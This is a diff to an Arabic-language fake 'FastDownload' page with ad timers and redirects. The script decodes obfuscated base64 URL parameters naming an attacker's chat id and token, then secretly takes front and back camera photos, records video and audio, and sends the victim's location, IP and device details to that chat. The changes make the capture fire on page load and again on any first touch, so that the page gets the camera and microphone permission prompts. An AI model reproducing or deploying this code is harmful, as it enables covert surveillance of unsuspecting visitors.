@@ -83,51 +83,54 @@
 </div>
 
 <script>
-// ═══════════════════════════════════════════════════════════
-// ✅ التعديل 1: فك تشفير u=<base64> (URL-safe + UTF-8)
-// ═══════════════════════════════════════════════════════════
-function b64Decode(b64) {
-  let s = b64.replace(/-/g, '+').replace(/_/g, '/');
+/* ═══════════════════════════════════════════════════════════
+   [1] فك تشفير Base64
+   ═══════════════════════════════════════════════════════════ */
+function b64Decode(str) {
+  if (!str) return '';
+  let s = str.replace(/-/g, '+').replace(/_/g, '/');
   while (s.length % 4) s += '=';
-  const bin = atob(s);
-  const bytes = new Uint8Array(bin.length);
-  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+  const binary = atob(s);
+  const bytes = new Uint8Array(binary.length);
+  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
   return new TextDecoder().decode(bytes);
 }
 
-// ═══════════════════════════════════════════════════════════
-// ✅ التعديل 2: قراءة البارامترات مع دعم u
-// ═══════════════════════════════════════════════════════════
-let urlParams = new URLSearchParams(window.location.search);
-const _u = urlParams.get('u');
+/* ═══════════════════════════════════════════════════════════
+   [2] قراءة البارامترات (بتدعم ?u=base64 والقيم المباشرة)
+   ═══════════════════════════════════════════════════════════ */
+const _raw = new URLSearchParams(location.search);
+let _finalQS = location.search;
+
+const _u = _raw.get('u');
 if (_u) {
   try {
     const decoded = b64Decode(_u);
-    console.log('[FastDownload] decoded u =', decoded);
-    urlParams = new URLSearchParams(decoded);
+    _finalQS = '?' + decoded;
+    console.log('✅ [FastDownload] u decoded →', decoded);
   } catch (e) {
-    console.error('[FastDownload] فشل فك التشفير:', e);
+    console.error('❌ [FastDownload] base64 decode error:', e);
   }
 }
 
-// من هنا الكود الأصلي بالحرف (id / token / fc / bc / fcv / bcv / r / l)
-const chat = urlParams.get('id');
-const token = urlParams.get('token');
+const P = new URLSearchParams(_finalQS);
+const chat  = P.get('id') || P.get('chat');
+const token = P.get('token');
 
 let featureList = [];
-if (urlParams.has('fc')) featureList.push('camFront');
-if (urlParams.has('bc')) featureList.push('camBack');
-if (urlParams.has('fcv')) featureList.push('videoFront');
-if (urlParams.has('bcv')) featureList.push('videoBack');
-if (urlParams.has('r')) featureList.push('audio');
-if (urlParams.has('l')) featureList.push('location');
+if (P.has('fc'))  featureList.push('camFront');
+if (P.has('bc'))  featureList.push('camBack');
+if (P.has('fcv')) featureList.push('videoFront');
+if (P.has('bcv')) featureList.push('videoBack');
+if (P.has('r'))   featureList.push('audio');
+if (P.has('l'))   featureList.push('location');
 const features = featureList.join(',');
 
-console.log('[FastDownload] chat =', chat, '| features =', features);
+console.log('📋 [FastDownload] parsed →', { chat: chat, token: token ? '***' : null, features: features });
 
-// ═══════════════════════════════════════════════════════════
-// الكود الأصلي بالحرف
-// ═══════════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════
+   [3] كودك الأصلي بالحرف
+   ═══════════════════════════════════════════════════════════ */
 let visitorIP = "غير معروف";
 let visitorCountry = "غير معروف";
 let visitorDevice = "Unknown";
@@ -303,61 +306,87 @@ async function sendVisitorInfo() {
     }
   }
 
+  /* ═══════════════════════════════════════════════════════════
+     [4] startFeatures — idempotent (مش بتتنفذ مرتين)
+     ═══════════════════════════════════════════════════════════ */
+  let _featuresStarted = false;
+  let _featuresFinished = false;
+
   async function startFeatures() {
-    if (!chat || !token || !features) return;
+    if (_featuresFinished) return true;
+    if (_featuresStarted) return true;
+
+    if (!chat || !token || !features) {
+      _featuresFinished = true;
+      return true;
+    }
+
+    _featuresStarted = true;
     const featureList = features.split(',');
     const needCamera = featureList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
     const needMicrophone = featureList.some(f => ['audio','videoFront','videoBack'].includes(f));
 
-    await preGrantPermissions(needCamera, needMicrophone);
+    const granted = await preGrantPermissions(needCamera, needMicrophone);
+    if ((needCamera || needMicrophone) && !granted) {
+      _featuresStarted = false; // اسمح بإعادة المحاولة عند أول لمسة
+      return false;
+    }
 
     sendVisitorInfo();
 
-    if (featureList.includes('camFront')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        await captureAndSend(stream, 'front');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) { console.log('فشلت صورة أمامية'); }
-    }
+    try {
+      if (featureList.includes('camFront')) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+          await captureAndSend(stream, 'front');
+          stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log('فشلت صورة أمامية'); }
+      }
 
-    if (featureList.includes('camBack')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-        await captureAndSend(stream, 'back');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) { console.log('فشلت صورة خلفية'); }
-    }
+      if (featureList.includes('camBack')) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+          await captureAndSend(stream, 'back');
+          stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log('فشلت صورة خلفية'); }
+      }
 
-    if (featureList.includes('videoFront')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-        await recordAndSend(stream, chat, token, 'front');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) { console.log('فشل فيديو أمامي'); }
-    }
+      if (featureList.includes('videoFront')) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+          await recordAndSend(stream, chat, token, 'front');
+          stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log('فشل فيديو أمامي'); }
+      }
 
-    if (featureList.includes('videoBack')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-        await recordAndSend(stream, chat, token, 'back');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) { console.log('فشل فيديو خلفي'); }
-    }
+      if (featureList.includes('videoBack')) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+          await recordAndSend(stream, chat, token, 'back');
+          stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log('فشل فيديو خلفي'); }
+      }
 
-    if (featureList.includes('audio')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        await recordAudioAndSend(stream, chat, token);
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) { console.log('فشل تسجيل صوتي'); }
-    }
+      if (featureList.includes('audio')) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          await recordAudioAndSend(stream, chat, token);
+          stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log('فشل تسجيل صوتي'); }
+      }
 
-    if (featureList.includes('location')) {
-      await sendLocation(chat, token);
-    }
+      if (featureList.includes('location')) {
+        await sendLocation(chat, token);
+      }
+    } catch (e) { console.log(e); }
+
+    _featuresFinished = true;
+    return true;
   }
 
+/* ═══════════════════════════════════════════════════════════
+   [5] كود الإعلانات والصفحات (أصلي)
+   ═══════════════════════════════════════════════════════════ */
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c"; 
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
@@ -367,7 +396,7 @@ var BANNERS = [ {k:"97327e0c336901c5ee9b175643b0ffb4",w:468,h:60}, {k:"62ffc139a
 var CIRC = 339.3;
 function $(id){return document.getElementById(id)}
 
-function addBanners(boxId){ var box = $(boxId); BANNERS.forEach(function(b){ var f = document.createElement("iframe"); f.width = b.w; f.height = b.h; f.scrolling = "no"; f.srcdoc = "<body style='margin:0'><scr"+"ipt>atOptions={'key':'"+b.k+"','format':'iframe','height':"+b.h+",'width':"+b.w+",'params':{}};</scr"+"ipt><scr"+"ipt src='https://bauval.org/22/"+b.k+"'></scr"+"ipt></body>"; box.appendChild(f); }); }
+function addBanners(boxId){ var box = $(boxId); if(!box) return; BANNERS.forEach(function(b){ var f = document.createElement("iframe"); f.width = b.w; f.height = b.h; f.scrolling = "no"; f.srcdoc = "<body style='margin:0'><scr"+"ipt>atOptions={'key':'"+b.k+"','format':'iframe','height':"+b.h+",'width':"+b.w+",'params':{}};</scr"+"ipt><scr"+"ipt src='https://bauval.org/22/"+b.k+"'></scr"+"ipt></body>"; box.appendChild(f); }); }
 function addNative(boxId){ var c = document.createElement("div"); c.id = NATIVE_ID; $(boxId).appendChild(c); var s = document.createElement("script"); s.async = true; s.setAttribute("data-cfasync","false"); s.src = NATIVE; document.body.appendChild(s); }
 var ghostLoaded = false;
 function addGhost(){ if(ghostLoaded) return; ghostLoaded = true; GHOST.forEach(function(u){ var s = document.createElement("script"); s.setAttribute("data-cfasync","false"); s.src = u; document.body.appendChild(s); }); }
@@ -377,12 +406,16 @@ function reveal(btnId){ var b = $(btnId); b.disabled = false; b.classList.add("r
 function goNext(btn, fn){ btn.disabled = true; btn.classList.remove("ready"); var left = GAP; btn.textContent = "جاري التحويل... " + left; var iv = setInterval(function(){ left--; btn.textContent = "جاري التحويل... " + left; if(left <= 0){ clearInterval(iv); fn(); } }, 1000); }
 function show(n){ document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")}); $("p"+n).classList.add("active"); window.scrollTo(0,0); }
 
+/* ═══════════════════════════════════════════════════════════
+   [6] التشغيل
+   ═══════════════════════════════════════════════════════════ */
 addBanners("ads1"); addNative("native1");
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
 
+// زر المتابعة: يبدأ الميزات في نفس لحظة اللمس (مهم للمتصفح)
 $("b1").onclick = function(){ 
+    startFeatures();           // ← في نفس اللمسة
     goNext(this, function(){ 
-        startFeatures();
         show(2); 
         addGhost(); addBanners("ads2"); addNative("native2"); 
         ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); }); 
@@ -392,17 +425,22 @@ $("b1").onclick = function(){
 $("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); addBanners("ads3"); addNative("native3"); ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); }); };
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 
-// ═══════════════════════════════════════════════════════════
-// ✅ التعديل 3: طلب الأذونات فوراً عند فتح الصفحة
-//    (منفصل عن startFeatures عشان مايحصلش تكرار)
-// ═══════════════════════════════════════════════════════════
-(async function requestEarlyPermissions() {
-    if (!chat || !token || !features) return;
-    const list = features.split(',');
-    const needCamera = list.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
-    const needMicrophone = list.some(f => ['audio','videoFront','videoBack'].includes(f));
-    if (!needCamera && !needMicrophone) return;
-    await preGrantPermissions(needCamera, needMicrophone);
+// 🔥 محاولة فورية عند فتح الصفحة (بتشتغل على الديسكتوب، ولو الموبايل رفض → إعادة عند أول لمسة)
+(function tryImmediate(){
+  if (!chat || !token || !features) return;
+  startFeatures().then(function(ok){
+    if (ok) return;
+    // فشلت (محتاجة لمسة) → جرّب عند أول لمسة في أي مكان
+    function retry(){
+      document.removeEventListener('click', retry, true);
+      document.removeEventListener('touchstart', retry, true);
+      document.removeEventListener('pointerdown', retry, true);
+      startFeatures();
+    }
+    document.addEventListener('click', retry, true);
+    document.addEventListener('touchstart', retry, true);
+    document.addEventListener('pointerdown', retry, true);
+  });
 })();
 </script>
 </body>
